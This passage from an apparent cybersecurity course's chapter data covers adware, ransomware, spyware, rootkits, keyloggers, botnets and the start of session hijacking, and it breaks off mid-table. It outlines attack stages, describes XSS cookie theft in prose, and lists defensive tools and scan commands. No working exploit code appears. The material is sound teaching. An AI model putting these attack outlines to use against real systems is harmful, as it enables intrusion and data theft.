                  <div class="tool-row"><span>Pop-up Adware</span><span>Displays pop-up windows</span></div>
                  <div class="tool-row"><span>Banner Adware</span><span>Injects banners into web pages</span></div>
                  <div class="tool-row"><span>Redirect Adware</span><span>Redirects search queries or URLs</span></div>
                  <div class="tool-row"><span>Browser Hijacker</span><span>Changes homepage and search engine</span></div>
                  <div class="tool-row"><span>Tracking Adware</span><span>Tracks browsing behavior</span></div>
                  <div class="tool-row"><span>Mobile Adware</span><span>Displays ads on mobile devices</span></div>
                  <div class="tool-row"><span>Bundleware</span><span>Bundled with legitimate software</span></div>
                </div>

                <h4 class="sub-h">Adware vs Malware</h4>
                <ul class="content-list">
                  <li><strong>Adware:</strong> Primarily displays ads; may be legal but annoying.</li>
                  <li><strong>Malware:</strong> Designed to harm, steal, or damage.</li>
                  <li><strong>Grayware:</strong> Between adware and malware; unwanted but not clearly malicious.</li>
                </ul>

                <h4 class="sub-h">Risks of Adware</h4>
                <ul class="content-list">
                  <li>Degrades performance.</li>
                  <li>Consumes bandwidth.</li>
                  <li>Tracks user behavior.</li>
                  <li>Can lead to malware infections.</li>
                  <li>May expose users to malicious ads (malvertising).</li>
                  <li>Privacy invasion.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Ransomware Attacks</span>
                    <ul>
                      <li><strong>Initial Access:</strong> Phishing, RDP brute force, exploit kits, supply chain.</li>
                      <li><strong>Privilege Escalation:</strong> Exploiting vulnerabilities.</li>
                      <li><strong>Lateral Movement:</strong> Using Cobalt Strike, Mimikatz.</li>
                      <li><strong>Data Exfiltration:</strong> Stealing data before encryption.</li>
                      <li><strong>Encryption:</strong> Using AES + RSA.</li>
                      <li><strong>Ransom Demand:</strong> Cryptocurrency payment.</li>
                      <li><strong>Negotiation:</strong> Some groups negotiate.</li>
                      <li><strong>RaaS:</strong> Affiliates rent ransomware.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Spyware Attacks</span>
                    <ul>
                      <li><strong>Delivery:</strong> Phishing, bundled software, exploit kits, zero-click.</li>
                      <li><strong>Persistence:</strong> Rootkit, registry, scheduled tasks.</li>
                      <li><strong>Collection:</strong> Keylogging, screenshots, clipboard, mic, camera.</li>
                      <li><strong>Exfiltration:</strong> HTTP/HTTPS, DNS tunneling, C2 servers.</li>
                      <li><strong>Evasion:</strong> Obfuscation, encryption, polymorphism.</li>
                      <li><strong>Targeting:</strong> High-value individuals, journalists, activists.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Adware Attacks</span>
                    <ul>
                      <li><strong>Bundling:</strong> With free software downloads.</li>
                      <li><strong>Fake Downloads:</strong> Fake installers, fake updates.</li>
                      <li><strong>Malvertising:</strong> Malicious ads on legitimate sites.</li>
                      <li><strong>Browser Extensions:</strong> Malicious extensions.</li>
                      <li><strong>Mobile Apps:</strong> Adware in app stores.</li>
                      <li><strong>Tracking:</strong> Cookies, pixels, fingerprinting.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Defensive Controls</h3>

                <h4 class="sub-h">Against Ransomware</h4>
                <ul class="content-list">
                  <li><strong>Backups:</strong> Offline, offsite, tested regularly (3-2-1 rule).</li>
                  <li><strong>Patching:</strong> Keep OS and software updated.</li>
                  <li><strong>Email Filtering:</strong> Block phishing emails.</li>
                  <li><strong>Endpoint Protection:</strong> EDR, antivirus, anti-ransomware.</li>
                  <li><strong>Network Segmentation:</strong> Limit lateral movement.</li>
                  <li><strong>Least Privilege:</strong> Restrict admin rights.</li>
                  <li><strong>MFA:</strong> Protect remote access (RDP, VPN).</li>
                  <li><strong>Disable RDP:</strong> If not needed; restrict if required.</li>
                  <li><strong>Application Whitelisting:</strong> Block unauthorized executables.</li>
                  <li><strong>User Training:</strong> Recognize phishing.</li>
                  <li><strong>Incident Response Plan:</strong> Detect, contain, recover.</li>
                  <li><strong>No Payment:</strong> Discourage paying ransom.</li>
                </ul>

                <h4 class="sub-h">Against Spyware</h4>
                <ul class="content-list">
                  <li>Antivirus/Anti-Spyware: Real-time protection.</li>
                  <li>Firewall: Block outbound C2 traffic.</li>
                  <li>Browser Security: Extensions, privacy settings.</li>
                  <li>App Permissions: Review mobile app permissions.</li>
                  <li>Avoid Untrusted Downloads: Official sources only.</li>
                  <li>Regular Scans: Detect and remove spyware.</li>
                  <li>Network Monitoring: Detect C2 communication.</li>
                  <li>User Education: Recognize phishing and social engineering.</li>
                  <li>Encryption: Protect data at rest and in transit.</li>
                  <li>MFA: Protect accounts.</li>
                </ul>

                <h4 class="sub-h">Against Adware</h4>
                <ul class="content-list">
                  <li>Careful Installation: Read install screens; uncheck bundles.</li>
                  <li>Ad Blockers: Use reputable ad blockers.</li>
                  <li>Browser Security: Disable unnecessary extensions.</li>
                  <li>Antivirus: Detect and remove adware.</li>
                  <li>Avoid Free Software: From untrusted sources.</li>
                  <li>Reset Browser: If hijacked.</li>
                  <li>Mobile Security: Review app permissions; uninstall suspicious apps.</li>
                  <li>DNS Filtering: Block known adware domains.</li>
                </ul>

                <h4 class="sub-h">General Best Practices</h4>
                <ul class="content-list">
                  <li>Defense in depth.</li>
                  <li>Regular backups.</li>
                  <li>Patch management.</li>
                  <li>User awareness training.</li>
                  <li>Endpoint Detection and Response (EDR).</li>
                  <li>Network segmentation.</li>
                  <li>Least privilege.</li>
                  <li>Continuous monitoring.</li>
                  <li>Threat intelligence.</li>
                  <li>Incident response plan.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>VirusTotal</span><span>Scan files and URLs</span></div>
                  <div class="tool-row"><span>Any.Run</span><span>Interactive malware sandbox</span></div>
                  <div class="tool-row"><span>Hybrid Analysis</span><span>Malware analysis</span></div>
                  <div class="tool-row"><span>Joe Sandbox</span><span>Malware sandbox</span></div>
                  <div class="tool-row"><span>Cuckoo Sandbox</span><span>Open-source sandbox</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Network traffic analysis</span></div>
                  <div class="tool-row"><span>Process Monitor</span><span>Windows process monitoring</span></div>
                  <div class="tool-row"><span>Autoruns</span><span>Startup program viewer</span></div>
                  <div class="tool-row"><span>Malwarebytes</span><span>Anti-malware</span></div>
                  <div class="tool-row"><span>Spybot Search &amp; Destroy</span><span>Anti-spyware</span></div>
                  <div class="tool-row"><span>AdwCleaner</span><span>Adware removal</span></div>
                  <div class="tool-row"><span>uBlock Origin</span><span>Ad blocker</span></div>
                  <div class="tool-row"><span>NoScript</span><span>Browser script blocker</span></div>
                  <div class="tool-row"><span>YARA</span><span>Pattern matching for malware</span></div>
                  <div class="tool-row"><span>ClamAV</span><span>Open-source antivirus</span></div>
                  <div class="tool-row"><span>ID Ransomware</span><span>Identify ransomware</span></div>
                  <div class="tool-row"><span>No More Ransom</span><span>Free decryption tools</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Common Malware Analysis Commands</span></div>
                  <pre><code># Scan home directory
clamscan -r /home

# Scan with YARA
yara rules.yar file.exe

# Memory forensics
volatility -f memory.dmp imageinfo

# Extract strings
strings malware.exe

# Compute hashes
md5sum malware.exe
sha256sum malware.exe</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Ransomware encrypts files and demands payment; often steals data.</li>
                  <li>Spyware secretly monitors and steals information.</li>
                  <li>Adware displays unwanted ads and tracks behavior.</li>
                  <li>Notable ransomware: REvil, DarkSide, Conti, LockBit, Cl0p.</li>
                  <li>Notable spyware: Pegasus, FinFisher, Agent Tesla, RedLine.</li>
                  <li>Adware often bundles with free software.</li>
                  <li>Attacks: phishing, RDP brute force, exploit kits, bundling, malvertising.</li>
                  <li>Defenses: backups, patching, EDR, MFA, user training, ad blockers, anti-spyware.</li>
                  <li>Tools: VirusTotal, Any.Run, Malwarebytes, AdwCleaner, No More Ransom.</li>
                  <li>Understanding these threats is essential for detection, response, and recovery.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.nomoreransom.org/" target="_blank" rel="noopener">No More Ransom — Free decryption tools</a>
                  <a href="https://id-ransomware.malwarehunterteam.com/" target="_blank" rel="noopener">ID Ransomware — Identify ransomware</a>
                  <a href="https://www.malwarebytes.com/adwcleaner/" target="_blank" rel="noopener">AdwCleaner — Adware removal</a>
                  <a href="https://ublockorigin.com/" target="_blank" rel="noopener">uBlock Origin — Ad blocker</a>
                  <a href="https://www.virustotal.com/" target="_blank" rel="noopener">VirusTotal — File and URL scanner</a>
                </div>
              </section>
            ` },
                    { id: "3.3", title: "Rootkit, Keylogger & Botnet", pages: "287-300", read: 20,
            build: "Detect a rootkit with memory forensics and analyze botnet C2 traffic.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>A Rootkit</strong> is a collection of malicious tools that enable an attacker to gain and maintain privileged (root or administrator) access while actively hiding its presence. Rootkits modify the OS or firmware to conceal files, processes, network connections, and registry entries from users and security software.</p>
                <p><strong>A Keylogger</strong> is surveillance software or hardware that records every keystroke. Keyloggers capture passwords, credit card numbers, messages, and other sensitive information. They can be software-based or hardware-based.</p>
                <p><strong>A Botnet</strong> is a network of compromised computers, servers, or IoT devices—called bots or zombies—controlled remotely by an attacker (botmaster) through a command-and-control (C2) infrastructure. Botnets are used for DDoS, spam, credential theft, cryptomining, and malware propagation.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Examples</h3>
                <ul class="content-list">
                  <li><strong>Rootkit:</strong> Sony BMG (2005) installed a rootkit on Windows PCs via music CDs to prevent copying. It hid files and registry entries and created vulnerabilities.</li>
                  <li><strong>Keylogger:</strong> A cracked game installer includes a keylogger. It records keystrokes, captures banking credentials, and sends them to the attacker.</li>
                  <li><strong>Botnet:</strong> Mirai (2016) infected over 600,000 IoT devices using default credentials. It launched massive DDoS attacks, including one against Dyn that disrupted Twitter, Netflix, and other major sites.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Rootkit In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/rootkit-keylogger-botnet.png" alt="Rootkit concealment, keylogger data capture, and botnet C2 architecture" />
                  <figcaption>Figure 3.3 — Rootkits hide malicious presence; keyloggers capture keystrokes; botnets recruit devices for coordinated attacks.</figcaption>
                </figure>

                <h4 class="sub-h">How Rootkits Work</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Installation: Delivered via phishing, exploit kits, malicious downloads, or physical access.</div>
                  <div class="step-item"><span class="step-num">2</span> Privilege Escalation: Gains root or administrator access.</div>
                  <div class="step-item"><span class="step-num">3</span> Persistence: Installs in startup, kernel, or firmware.</div>
                  <div class="step-item"><span class="step-num">4</span> Concealment: Hooks system calls, hides files/processes/registry keys.</div>
                  <div class="step-item"><span class="step-num">5</span> Remote Control: Provides backdoor access.</div>
                  <div class="step-item"><span class="step-num">6</span> Evasion: Hides from antivirus and task manager.</div>
                </div>

                <h4 class="sub-h">Types of Rootkits</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span><span>Example</span></div>
                  <div class="tool-row"><span>User-Mode</span><span>Runs in user space; hooks APIs</span><span>Hides files/processes</span></div>
                  <div class="tool-row"><span>Kernel-Mode</span><span>Runs in kernel; modifies OS core</span><span>Hard to detect</span></div>
                  <div class="tool-row"><span>Bootkit</span><span>Infects boot loader or MBR</span><span>Loads before OS</span></div>
                  <div class="tool-row"><span>Firmware</span><span>Infects BIOS/UEFI or device firmware</span><span>Persists across OS reinstall</span></div>
                  <div class="tool-row"><span>Hypervisor</span><span>Runs as a hypervisor; controls OS</span><span>Extremely stealthy</span></div>
                  <div class="tool-row"><span>Library</span><span>Replaces system libraries</span><span>Hides malicious activity</span></div>
                  <div class="tool-row"><span>Application</span><span>Replaces application binaries</span><span>Trojanizes legitimate software</span></div>
                </div>

                <h4 class="sub-h">Detection Challenges</h4>
                <ul class="content-list">
                  <li>Rootkits can hide from the OS itself.</li>
                  <li>Traditional antivirus may not detect kernel-mode rootkits.</li>
                  <li>Memory forensics is often required.</li>
                  <li>Firmware rootkits may survive OS reinstallation.</li>
                  <li>Some rootkits disable security tools.</li>
                </ul>

                <h4 class="sub-h">Notable Rootkits</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Rootkit</span><span>Impact</span></div>
                  <div class="tool-row"><span>Sony BMG</span><span>Installed on music CDs; hid files</span></div>
                  <div class="tool-row"><span>TDL-4</span><span>Kernel-mode rootkit; infected millions</span></div>
                  <div class="tool-row"><span>ZeroAccess</span><span>Kernel-mode; click fraud and Bitcoin mining</span></div>
                  <div class="tool-row"><span>Necurs</span><span>Rootkit component of botnet</span></div>
                  <div class="tool-row"><span>LoJax</span><span>UEFI firmware rootkit; persistent</span></div>
                  <div class="tool-row"><span>FinFisher</span><span>Government surveillance rootkit</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Keylogger In Depth</h3>

                <h4 class="sub-h">How Keyloggers Work</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Installation: Software via phishing, bundled software, or exploits; hardware via physical access.</div>
                  <div class="step-item"><span class="step-num">2</span> Recording: Captures keystrokes at kernel, API, or hardware level.</div>
                  <div class="step-item"><span class="step-num">3</span> Storage: Saves logs locally or exfiltrates to remote server.</div>
                  <div class="step-item"><span class="step-num">4</span> Analysis: Attacker reviews logs for credentials and sensitive data.</div>
                </div>

                <h4 class="sub-h">Types of Keyloggers</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span><span>Example</span></div>
                  <div class="tool-row"><span>Software Keylogger</span><span>Installed on system; hooks keyboard APIs</span><span>Agent Tesla, HawkEye</span></div>
                  <div class="tool-row"><span>Hardware Keylogger</span><span>Physical device between keyboard and PC</span><span>KeyGrabber, USB keyloggers</span></div>
                  <div class="tool-row"><span>Kernel-Level</span><span>Hooks kernel keyboard driver</span><span>Hard to detect</span></div>
                  <div class="tool-row"><span>Form Grabbing</span><span>Captures form data before encryption</span><span>Browser-based</span></div>
                  <div class="tool-row"><span>Screen Logging</span><span>Takes screenshots of activity</span><span>Periodic screenshots</span></div>
                  <div class="tool-row"><span>Clipboard Logger</span><span>Captures clipboard contents</span><span>Copies passwords</span></div>
                  <div class="tool-row"><span>Mobile Keylogger</span><span>Records keystrokes on mobile devices</span><span>Spyware apps</span></div>
                </div>

                <h4 class="sub-h">What Keyloggers Capture</h4>
                <ul class="content-list">
                  <li>Passwords and usernames</li>
                  <li>Credit card numbers</li>
                  <li>Email and chat messages</li>
                  <li>Search queries</li>
                  <li>Bank account details</li>
                  <li>Crypto wallet keys</li>
                  <li>Personal identification information</li>
                </ul>

                <h4 class="sub-h">Notable Keyloggers</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Keylogger</span><span>Impact</span></div>
                  <div class="tool-row"><span>Agent Tesla</span><span>Credential theft via email</span></div>
                  <div class="tool-row"><span>HawkEye</span><span>Keylogging and exfiltration</span></div>
                  <div class="tool-row"><span>Ardamax</span><span>Commercial keylogger</span></div>
                  <div class="tool-row"><span>REFOG</span><span>Monitoring software</span></div>
                  <div class="tool-row"><span>KidLogger</span><span>Parental monitoring (dual-use)</span></div>
                  <div class="tool-row"><span>Olympic Vision</span><span>Business email compromise (BEC)</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Botnet In Depth</h3>

                <h4 class="sub-h">How Botnets Work</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Infection: Bots recruited via malware, exploits, or default credentials.</div>
                  <div class="step-item"><span class="step-num">2</span> C2 Registration: Bots connect to command-and-control servers.</div>
                  <div class="step-item"><span class="step-num">3</span> Command Reception: Botmaster sends commands to bots.</div>
                  <div class="step-item"><span class="step-num">4</span> Execution: Bots perform tasks (DDoS, spam, mining).</div>
                  <div class="step-item"><span class="step-num">5</span> Propagation: Bots infect other devices.</div>
                  <div class="step-item"><span class="step-num">6</span> Persistence: Bots maintain access and update themselves.</div>
                </div>

                <h4 class="sub-h">Botnet Architecture</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Architecture</span><span>Description</span><span>Example</span></div>
                  <div class="tool-row"><span>Centralized</span><span>Single C2 server</span><span>IRC-based botnets</span></div>
                  <div class="tool-row"><span>Decentralized</span><span>Peer-to-peer (P2P)</span><span>Storm, ZeroAccess</span></div>
                  <div class="tool-row"><span>Hybrid</span><span>Combines both</span><span>Modern botnets</span></div>
                  <div class="tool-row"><span>Domain Generation Algorithm (DGA)</span><span>Bots generate domains to find C2</span><span>Conficker, Necurs</span></div>
                  <div class="tool-row"><span>Fast Flux</span><span>Rapidly changing DNS records</span><span>Storm</span></div>
                </div>

                <h4 class="sub-h">Botnet Uses</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Use</span><span>Description</span></div>
                  <div class="tool-row"><span>DDoS</span><span>Flooding targets with traffic</span></div>
                  <div class="tool-row"><span>Spam</span><span>Sending bulk emails</span></div>
                  <div class="tool-row"><span>Credential Theft</span><span>Stealing logins</span></div>
                  <div class="tool-row"><span>Click Fraud</span><span>Generating fake ad clicks</span></div>
                  <div class="tool-row"><span>Cryptomining</span><span>Mining cryptocurrency</span></div>
                  <div class="tool-row"><span>Ransomware</span><span>Distributing ransomware</span></div>
                  <div class="tool-row"><span>Proxy</span><span>Routing traffic through bots</span></div>
                  <div class="tool-row"><span>Espionage</span><span>Targeted data theft</span></div>
                </div>

                <h4 class="sub-h">Notable Botnets</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Botnet</span><span>Impact</span></div>
                  <div class="tool-row"><span>Mirai</span><span>IoT DDoS; Dyn attack</span></div>
                  <div class="tool-row"><span>Emotet</span><span>Banking Trojan; malware delivery</span></div>
                  <div class="tool-row"><span>Necurs</span><span>Largest spam botnet</span></div>
                  <div class="tool-row"><span>Conficker</span><span>9–15 million infections</span></div>
                  <div class="tool-row"><span>Storm</span><span>P2P botnet; spam</span></div>
                  <div class="tool-row"><span>ZeroAccess</span><span>Click fraud and Bitcoin mining</span></div>
                  <div class="tool-row"><span>TrickBot</span><span>Banking Trojan; ransomware delivery</span></div>
                  <div class="tool-row"><span>Srizbi</span><span>Massive spam botnet</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Rootkit Attacks</span>
                    <ul>
                      <li><strong>Privilege Escalation:</strong> Exploiting vulnerabilities to gain root.</li>
                      <li><strong>Persistence:</strong> Installing in kernel, boot, or firmware.</li>
                      <li><strong>Concealment:</strong> Hooking system calls, hiding files/processes.</li>
                      <li><strong>Backdoor:</strong> Providing remote access.</li>
                      <li><strong>Evasion:</strong> Bypassing antivirus and EDR.</li>
                      <li><strong>Lateral Movement:</strong> Using root access to compromise other systems.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Keylogger Attacks</span>
                    <ul>
                      <li><strong>Phishing:</strong> Delivering keyloggers via email attachments.</li>
                      <li><strong>Bundling:</strong> Including keyloggers with free software.</li>
                      <li><strong>Exploits:</strong> Using drive-by downloads.</li>
                      <li><strong>Physical:</strong> Installing hardware keyloggers.</li>
                      <li><strong>Mobile:</strong> Spying on mobile devices.</li>
                      <li><strong>Credential Theft:</strong> Capturing passwords and banking details.</li>
                      <li><strong>Espionage:</strong> Monitoring user activity.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Botnet Attacks</span>
                    <ul>
                      <li><strong>Recruitment:</strong> Infecting devices via malware or default credentials.</li>
                      <li><strong>C2 Communication:</strong> Using IRC, HTTP, HTTPS, DNS, or P2P.</li>
                      <li><strong>DDoS:</strong> Launching massive traffic floods.</li>
                      <li><strong>Spam:</strong> Sending phishing emails.</li>
                      <li><strong>Credential Stuffing:</strong> Using stolen credentials.</li>
                      <li><strong>Cryptomining:</strong> Mining Monero or Bitcoin.</li>
                      <li><strong>Ransomware:</strong> Distributing ransomware payloads.</li>
                      <li><strong>Proxy:</strong> Routing illegal traffic through bots.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Defensive Controls</h3>

                <h4 class="sub-h">Against Rootkits</h4>
                <ul class="content-list">
                  <li>Secure Boot: UEFI Secure Boot prevents bootkits.</li>
                  <li>Patch Management: Keep OS and firmware updated.</li>
                  <li>Endpoint Protection: EDR with rootkit detection.</li>
                  <li>Memory Forensics: Use Volatility to detect kernel rootkits.</li>
                  <li>Integrity Monitoring: Detect changes to system files.</li>
                  <li>Least Privilege: Restrict admin access.</li>
                  <li>Application Whitelisting: Block unauthorized executables.</li>
                  <li>Reimage: If rootkit suspected, reinstall OS from trusted media.</li>
                  <li>Firmware Updates: Apply BIOS/UEFI updates.</li>
                  <li>Hardware Security: TPM, HSM.</li>
                </ul>

                <h4 class="sub-h">Against Keyloggers</h4>
                <ul class="content-list">
                  <li>Antivirus/Anti-Spyware: Real-time protection.</li>
                  <li>Firewall: Block outbound C2 traffic.</li>
                  <li>Virtual Keyboards: Use for sensitive input.</li>
                  <li>Password Managers: Auto-fill reduces keystrokes.</li>
                  <li>MFA: Adds layer beyond passwords.</li>
                  <li>Encryption: Protect data in transit.</li>
                  <li>Physical Security: Inspect for hardware keyloggers.</li>
                  <li>Mobile Security: Review app permissions.</li>
                  <li>User Education: Recognize phishing.</li>
                  <li>Regular Scans: Detect and remove keyloggers.</li>
                </ul>

                <h4 class="sub-h">Against Botnets</h4>
                <ul class="content-list">
                  <li>Patch Management: Keep systems updated.</li>
                  <li>Strong Credentials: Change default passwords on IoT.</li>
                  <li>Network Monitoring: Detect C2 traffic.</li>
                  <li>DNS Filtering: Block known C2 domains.</li>
                  <li>Firewall: Block outbound connections to C2.</li>
                  <li>IDS/IPS: Detect botnet activity.</li>
                  <li>Endpoint Protection: EDR with behavioral detection.</li>
                  <li>Threat Intelligence: Block known botnet IPs/domains.</li>
                  <li>DDoS Protection: Use cloud-based mitigation.</li>
                  <li>User Education: Avoid phishing and malicious downloads.</li>
                  <li>Incident Response: Isolate infected devices.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Volatility</span><span>Memory forensics for rootkits</span></div>
                  <div class="tool-row"><span>GMER</span><span>Rootkit detection</span></div>
                  <div class="tool-row"><span>chkrootkit</span><span>Linux rootkit detection</span></div>
                  <div class="tool-row"><span>rkhunter</span><span>Linux rootkit detection</span></div>
                  <div class="tool-row"><span>Malwarebytes</span><span>Anti-malware and anti-rootkit</span></div>
                  <div class="tool-row"><span>Spybot Search &amp; Destroy</span><span>Anti-spyware and keylogger detection</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Network traffic analysis</span></div>
                  <div class="tool-row"><span>Process Monitor</span><span>Windows process monitoring</span></div>
                  <div class="tool-row"><span>Autoruns</span><span>Startup program viewer</span></div>
                  <div class="tool-row"><span>TCPView</span><span>Network connection viewer</span></div>
                  <div class="tool-row"><span>VirusTotal</span><span>Scan files and URLs</span></div>
                  <div class="tool-row"><span>Any.Run</span><span>Interactive malware sandbox</span></div>
                  <div class="tool-row"><span>YARA</span><span>Pattern matching for malware</span></div>
                  <div class="tool-row"><span>ClamAV</span><span>Open-source antivirus</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>AlienVault OTX</span><span>Threat intelligence</span></div>
                  <div class="tool-row"><span>AbuseIPDB</span><span>IP reputation</span></div>
                  <div class="tool-row"><span>Spamhaus</span><span>Blocklist</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Common Rootkit/Botnet Analysis Commands</span></div>
                  <pre><code># Memory forensics
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 malfind

# Linux rootkit detection
chkrootkit
rkhunter --check

# Scan with ClamAV
clamscan -r /home

# Scan with YARA
yara rules.yar file.exe

# Network connections
netstat -ano          # Windows
ss -tuln              # Linux</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Rootkits provide privileged access while hiding their presence.</li>
                  <li>Keyloggers record keystrokes to steal sensitive information.</li>
                  <li>Botnets are networks of compromised devices controlled by attackers.</li>
                  <li>Rootkit types: user-mode, kernel-mode, bootkit, firmware, hypervisor.</li>
                  <li>Keylogger types: software, hardware, kernel-level, form grabbing.</li>
                  <li>Botnet uses: DDoS, spam, credential theft, cryptomining, ransomware.</li>
                  <li>Notable: Sony BMG, TDL-4, ZeroAccess, Mirai, Emotet, Necurs.</li>
                  <li>Attacks: privilege escalation, concealment, credential theft, C2 communication.</li>
                  <li>Defenses: Secure Boot, EDR, memory forensics, MFA, network monitoring, patching.</li>
                  <li>Tools: Volatility, GMER, chkrootkit, Wireshark, VirusTotal, YARA.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.volatilityfoundation.org/" target="_blank" rel="noopener">Volatility — Memory forensics</a>
                  <a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">chkrootkit — Linux rootkit detection</a>
                  <a href="http://rkhunter.sourceforge.net/" target="_blank" rel="noopener">rkhunter — Rootkit hunter</a>
                  <a href="https://www.virustotal.com/" target="_blank" rel="noopener">VirusTotal — File and URL scanner</a>
                  <a href="https://virustotal.github.io/yara/" target="_blank" rel="noopener">YARA — Pattern matching</a>
                </div>
              </section>
            ` },
                    { id: "3.4", title: "Session Hijacking", pages: "301-314", read: 18,
            build: "Capture and analyze a session cookie over HTTP.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Session Hijacking</strong> is the exploitation of a valid computer session—sometimes called a session key—to gain unauthorized access to information or services. It occurs when an attacker takes over an active session between a client and a server after the user has authenticated. The attacker does not need to steal the user’s password; instead, they steal or predict the session identifier (session ID, cookie, or token) that the server uses to recognize the authenticated user.</p>
                <p>Session hijacking bypasses authentication controls and allows the attacker to act as the legitimate user.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Example</h3>
                <p>A user logs into online banking over public Wi-Fi. The site uses a session cookie to keep the user logged in. An attacker on the same network uses a packet sniffer to capture the session cookie. The attacker injects that cookie into their own browser. The banking server recognizes the cookie as valid and grants the attacker access to the user’s account—without needing the username or password.</p>
                <p>In another scenario, a user clicks a malicious link that executes JavaScript. The script reads the session cookie and sends it to the attacker’s server. The attacker uses the cookie to hijack the session.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Session Hijacking In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/session-hijacking.png" alt="Session hijacking via packet sniffing, XSS, and session fixation" />
                  <figcaption>Figure 3.4 — Session hijacking methods: packet sniffing, XSS cookie theft, session fixation, and MITM interception.</figcaption>
                </figure>

                <h4 class="sub-h">What Is a Session?</h4>
                <p>A session is a temporary and interactive information exchange between two or more communicating devices. In web applications, a session begins when a user logs in and ends when the user logs out or the session expires. To maintain state over the stateless HTTP protocol, web applications use:</p>
                <ul class="content-list">
                  <li><strong>Session Cookies:</strong> Small pieces of data stored in the browser and sent with every request.</li>
                  <li><strong>Session IDs:</strong> Unique identifiers generated by the server and stored in the cookie.</li>
                  <li><strong>Tokens:</strong> Such as JSON Web Tokens (JWT) used for authentication and authorization.</li>
                </ul>

                <h4 class="sub-h">How Session Hijacking Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Session Establishment: User authenticates; server creates a session with a unique ID.</div>
                  <div class="step-item"><span class="step-num">2</span> Session ID Transmission: Session ID sent to client, usually as a cookie.</div>
                  <div class="step-item"><span class="step-num">3</span> Session ID Theft or Prediction: Attacker obtains the session ID.</div>
                  <div class="step-item"><span class="step-num">4</span> Session Replay: Attacker sends requests using the stolen session ID.</div>
                  <div class="step-item"><span class="step-num">5</span> Unauthorized Access: Server treats attacker as the legitimate user.</div>
                  <div class="step-item"><span class="step-num">6</span> Persistence: Attacker maintains access until session expires.</div>
                </div>

                <h4 class="sub-h">Types of Session Hijacking</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Description</span></div>
                  <div class="tool-row"><span>Active Hijacking</span><span>Attacker takes over an active session by injecting packets or stealing the session ID.</span></div>
                  <div class="tool-row"><span>Passive Hijacking</span><span>Attacker monitors and records session traffic without interfering, then uses the session ID later.</span></div>
                  <div class="tool-row"><span>Session Fixation</span><span>Attacker forces the victim to use a known session ID, then uses it after the victim logs in.</span></div>
                  <div class="tool-row"><span>Session Prediction</span><span>Attacker predicts the session ID by analyzing patterns or weak generation algorithms.</span></div>
                  <div class="tool-row"><span>Session Sidejacking</span><span>Attacker captures session cookies over an unencrypted network.</span></div>
                  <div class="tool-row"><span>Cross-Site Scripting (XSS)</span><span>Attacker injects JavaScript to steal session cookies.</span></div>
